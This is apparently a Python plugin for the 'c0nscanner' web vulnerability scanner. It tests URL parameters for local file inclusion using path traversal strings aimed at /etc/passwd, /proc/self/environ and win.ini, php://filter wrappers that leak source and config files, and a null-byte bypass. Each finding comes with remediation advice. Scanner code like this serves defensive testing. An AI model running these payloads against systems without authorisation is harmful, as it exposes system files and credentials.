"""local/remote file inclusion scanner plugin for c0nscanner.

detects path traversal, lfi, rfi, and php wrapper attacks.
"""

from __future__ import annotations

import re

from c0nscanner.core.http_engine import HTTPEngine
from c0nscanner.core.target import Target
from c0nscanner.plugins.base import BasePlugin, Finding


# patterns indicating successful file inclusion
FILE_CONTENT_PATTERNS = [
    # /etc/passwd
    (r"root:[x*]:\d+:\d+:", "/etc/passwd content detected"),
    # /etc/shadow
    (r"root:\$\d\$", "/etc/shadow content detected"),
    # /etc/hosts
    (r"127\.0\.0\.1\s+localhost", "/etc/hosts content detected"),
    # windows win.ini
    (r"\[fonts\]", "windows win.ini content detected"),
    (r"\[extensions\]", "windows win.ini content detected"),
    # windows hosts
    (r"#.*localhost name resolution", "windows hosts file detected"),
    # proc files
    (r"DOCUMENT_ROOT=", "/proc/self/environ content detected"),
    (r"HTTP_USER_AGENT=", "/proc/self/environ content detected"),
    # php source via wrappers (base64 decoded starts with <?php)
    (r"PD9waHA", "php source code leaked via php://filter (base64)"),
]

FILE_PATTERNS = [(re.compile(p, re.IGNORECASE), desc) for p, desc in FILE_CONTENT_PATTERNS]


class LFIPlugin(BasePlugin):
    """local/remote file inclusion vulnerability scanner."""

    name = "lfi"
    description = "lfi/rfi detection with path traversal and wrappers"
    default_severity = "high"

    async def scan(self, target: Target, http: HTTPEngine) -> list[Finding]:
        findings: list[Finding] = []

        if not target.is_parameterized:
            return findings

        depth = self._module_config.get("depth", 8)

        for param in target.param_names:
            # test path traversal
            result = await self._test_path_traversal(target, param, http, depth)
            if result:
                findings.append(result)
                continue

            # test php wrappers
            result = await self._test_php_wrappers(target, param, http)
            if result:
                findings.append(result)
                continue

            # test null byte injection
            result = await self._test_null_byte(target, param, http, depth)
            if result:
                findings.append(result)

        return findings

    async def _test_path_traversal(
        self, target: Target, param: str, http: HTTPEngine, depth: int
    ) -> Finding | None:
        """test for path traversal / lfi."""
        targets_unix = [
            ("etc/passwd", r"root:[x*]:\d+:\d+:"),
            ("etc/hosts", r"127\.0\.0\.1"),
            ("proc/self/environ", r"(DOCUMENT_ROOT|HTTP_)"),
        ]
        targets_win = [
            ("windows/win.ini", r"\[(fonts|extensions)\]"),
            ("windows/system32/drivers/etc/hosts", r"(localhost|127\.0\.0\.1)"),
        ]

        for target_file, pattern in targets_unix + targets_win:
            # try different traversal depths
            for d in range(1, depth + 1):
                # unix-style
                traversal = "../" * d + target_file
                url = target.with_payload(param, traversal)
                resp = await http.get(url)

                if not resp.error and re.search(pattern, resp.body, re.IGNORECASE):
                    return self.make_finding(
                        title=f"local file inclusion in '{param}'",
                        url=target.url,
                        severity="high",
                        parameter=param,
                        payload=traversal,
                        evidence=f"file content detected: {target_file}",
                        remediation="never use user input to construct file paths. "
                                    "use a whitelist of allowed files, implement "
                                    "proper input validation, and chroot the application.",
                        cvss=7.5,
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
                            "https://cwe.mitre.org/data/definitions/98.html",
                        ],
                    )

                # windows-style (backslash)
                if "\\" in target_file or "windows" in target_file:
                    traversal_win = "..\\" * d + target_file.replace("/", "\\")
                    url = target.with_payload(param, traversal_win)
                    resp = await http.get(url)

                    if not resp.error and re.search(pattern, resp.body, re.IGNORECASE):
                        return self.make_finding(
                            title=f"local file inclusion in '{param}' (windows)",
                            url=target.url,
                            severity="high",
                            parameter=param,
                            payload=traversal_win,
                            evidence=f"file content detected: {target_file}",
                            remediation="never use user input to construct file paths.",
                            cvss=7.5,
                            references=[
                                "https://cwe.mitre.org/data/definitions/22.html",
                            ],
                        )

        return None

    async def _test_php_wrappers(
        self, target: Target, param: str, http: HTTPEngine
    ) -> Finding | None:
        """test for php wrapper-based file inclusion."""
        wrappers = [
            (
                "php://filter/convert.base64-encode/resource=index",
                r"PD9waHA",
                "php://filter wrapper leaked source code (base64)",
            ),
            (
                "php://filter/convert.base64-encode/resource=../config",
                r"PD9waHA",
                "php://filter wrapper leaked config file (base64)",
            ),
            (
                "php://filter/read=string.rot13/resource=index.php",
                r"<\?cuc",
                "php://filter wrapper leaked source code (rot13)",
            ),
        ]

        for payload, pattern, desc in wrappers:
            url = target.with_payload(param, payload)
            resp = await http.get(url)

            if not resp.error and re.search(pattern, resp.body):
                return self.make_finding(
                    title=f"php wrapper file inclusion in '{param}'",
                    url=target.url,
                    severity="high",
                    parameter=param,
                    payload=payload,
                    evidence=desc,
                    remediation="disable dangerous php wrappers in php.ini. "
                                "set allow_url_include=Off and validate file paths.",
                    cvss=7.5,
                    references=[
                        "https://www.php.net/manual/en/wrappers.php",
                    ],
                )

        return None

    async def _test_null_byte(
        self, target: Target, param: str, http: HTTPEngine, depth: int
    ) -> Finding | None:
        """test for null byte injection to bypass extension checks."""
        for d in range(3, min(depth + 1, 8)):
            traversal = "../" * d + "etc/passwd%00"
            url = target.with_payload(param, traversal)
            resp = await http.get(url)

            if not resp.error and re.search(r"root:[x*]:\d+:\d+:", resp.body):
                return self.make_finding(
                    title=f"lfi via null byte injection in '{param}'",
                    url=target.url,
                    severity="high",
                    parameter=param,
                    payload=traversal,
                    evidence="null byte bypassed file extension check, /etc/passwd leaked",
                    remediation="upgrade php (null byte fixed in 5.3.4+). "
                                "validate and sanitize file paths.",
                    cvss=7.5,
                    references=[
                        "https://cwe.mitre.org/data/definitions/158.html",
                    ],
                )

        return None
